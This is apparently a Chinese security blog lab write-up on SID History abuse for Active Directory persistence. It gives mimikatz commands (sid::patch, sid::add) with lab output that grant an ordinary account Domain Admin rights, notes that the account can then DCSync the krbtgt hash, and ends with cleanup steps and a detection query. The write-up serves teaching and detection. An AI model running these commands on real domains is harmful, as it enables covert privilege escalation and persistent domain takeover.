---
title: SID History
date: 2020-12-31 23:59:50 +0800
categories: [域安全, TA0003持久化]
tags: [SIDHistory, TA0003持久化]     # TAG names should always be lowercase
typora-root-url: ..
---



## 0x00 简介

攻击者在获取Domain Admins权限后，可以通过SID Hisotry给普通账户提权，用于权限维持



**参考：**

[Sneaky Active Directory Persistence #14: SID History](https://adsecurity.org/?p=1772)



## 0x01 SID History

> [SID History](https://msdn.microsoft.com/en-us/library/ms679833(v=vs.85).aspx) is an attribute that supports [migration scenarios](https://technet.microsoft.com/en-us/library/cc779590(v=ws.10).aspx). Every user account has an associated [Security IDentifier (SID)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379571(v=vs.85).aspx) which is used to track the security principal and the access the account has when connecting to resources. SID History enables access for another account to effectively be cloned to another. This is extremely useful to ensure users retain access when moved (migrated) from one domain to another. Since the user’s SID changes when the new account is created, the old SID needs to map to the new one. When a user in Domain A is migrated to Domain B, a new user account is created in DomainB and DomainA user’s SID is added to DomainB’s user account’s SID History attribute. This ensures that DomainB user can still access resources in DomainA.
>
> The interesting part of this is that SID History works for SIDs in the same domain as it does across domains in the same forest, which means that a regular user account in DomainA can contain DomainA SIDs and if the DomainA SIDs are for privileged accounts or groups, a regular user account can be granted Domain Admin rights without being a member of Domain Admins.
>
> 
>
> Note: A regular user in a domain can contain the Enterprise Admin SID in its SID History from another domain in the Active Directory forest, thus “elevating” access for the user account to effective Domain Admin in all domains in the forest. if you have a forest trust *without* SID Filtering enabled (also called Quarantine), it’s possible to inject a SID from another forest and it will be added to the user token when authenticated and used for access evaluations.

域内用户用SID作为自己的ID，SID History属性相当于表明此用户还有其他的ID，因此也就可以访问授权这些SID能访问的资源。SID History的设计是用于账户跨域迁移时，保留对原有域资源的访问。

修改SID History需要Domain Admins权限，攻击者在获取Domain Admins权限后，可以通过SID Hisotry给普通账户提权，用于权限维持。



## 0x02 利用

即使有Domain Admins权限，但SID History属性是受保护属性，不能直接修改

```
PS C:\Users\Administrator> Get-ADUser win10 -Properties memberof,sidhistory


DistinguishedName : CN=win10,CN=Users,DC=ring2,DC=com
Enabled           : True
GivenName         :
MemberOf          : {}
Name              : win10
ObjectClass       : user
ObjectGUID        : 9f39c0a4-a5c2-440a-a17f-748c1b32726d
SamAccountName    : win10
SID               : S-1-5-21-2475887593-94489213-2292866110-1103
SIDHistory        : {}
Surname           : win10
UserPrincipalName : win10@ring2.com



PS C:\Users\Administrator> Set-ADUser win10 -Replace @{sidhistory="S-1-5-21-2475887593-94489213-2292866110-500"}
Set-ADUser : Access is denied
At line:1 char:1
+ Set-ADUser win10 -Replace @{sidhistory="S-1-5-21-2475887593-94489213- ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (win10:ADUser) [Set-ADUser], UnauthorizedAccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.Management
```



### mimikatz

由于SID Hisotory是受保护属性，因此需要先给NTDS服务(LSASS进程)打Patch

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sid::patch
Patch 1/2: "ntds" service patched
Patch 2/2: ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000057)
```



```
mimikatz # sid::add /sam:win10 /new:ring2\administrator

CN=win10,CN=Users,DC=ring2,DC=com
  name: win10
  objectGUID: {9f39c0a4-a5c2-440a-a17f-748c1b32726d}
  objectSid: S-1-5-21-2475887593-94489213-2292866110-1103
  sAMAccountName: win10

  * Will try to add 'sIDHistory' this new SID:'S-1-5-21-2475887593-94489213-2292866110-500': OK!
  
------------------------------------------------------------------------------------------------------------------------
mimikatz # sid::add /new:S-1-5-21-2475887593-94489213-2292866110-500 /sid:S-1-5-21-2475887593-94489213-2292866110-1103

CN=win10,CN=Users,DC=ring2,DC=com
  name: win10
  objectGUID: {9f39c0a4-a5c2-440a-a17f-748c1b32726d}
  objectSid: S-1-5-21-2475887593-94489213-2292866110-1103
  sAMAccountName: win10

  * Will try to add 'sIDHistory' this new SID:'S-1-5-21-2475887593-94489213-2292866110-500': OK!
```



```
mimikatz # sid::query /sam:win10

CN=win10,CN=Users,DC=ring2,DC=com
  name: win10
  objectGUID: {9f39c0a4-a5c2-440a-a17f-748c1b32726d}
  objectSid: S-1-5-21-2475887593-94489213-2292866110-1103
  sAMAccountName: win10
  sIDHistory:
   [0] S-1-5-21-2475887593-94489213-2292866110-500 ( User -- RING2\Administrator )

mimikatz # sid::lookup /name:win10
Name  : win10
Type  : User
Domain: RING2
SID   : S-1-5-21-2475887593-94489213-2292866110-1103
```



添加SID History后，win10账户有权限做DCSync获取krbtgt账户Hash，不过我测试时需要重新登录win10账户才生效。

![SneakyPersistence-AddSIDHistory-BobaFett-Exploit-PS-Krbtgt](/assets/img/SneakyPersistence-AddSIDHistory-BobaFett-Exploit-PS-Krbtgt.png)



清理SID History

```
mimikatz # sid::clear /sam:win10

CN=win10,CN=Users,DC=ring2,DC=com
  name: win10
  objectGUID: {9f39c0a4-a5c2-440a-a17f-748c1b32726d}
  objectSid: S-1-5-21-2475887593-94489213-2292866110-1103
  sAMAccountName: win10
  sIDHistory:
   [0] S-1-5-21-2475887593-94489213-2292866110-500 ( User -- RING2\Administrator )

  * Will try to clear 'sIDHistory': OK!
```



其实，做`sid::patch`后，已经可以通过`Set-ADUser`来修改SID History了，因此这种方式要重启NTDS服务才能彻底清理环境，重新置SID History为受保护属性。

![image-20201226121818155](/assets/img/image-20201226121818155.png)

```
Get-ADUser win10 -Properties sidhistory | foreach {Set-ADUser $_ -remove @{sidhistory=$_.sidhistory.value}};
```

![image-20201226123312325](/assets/img/image-20201226123312325.png)





## 0x03 检测

```
# Detect Same Domain SID History
Import-Module ActiveDirectory
[string]$DomainSID = ( (Get-ADDomain).DomainSID.Value )

Get-ADUser -Filter “SIDHistory -Like ‘*'” -Properties SIDHistory | `
Where { $_.SIDHistory -Like “$DomainSID-*” }
```

- 4765: SID History was added to an account.
- 4766: An attempt to add SID History to an account failed.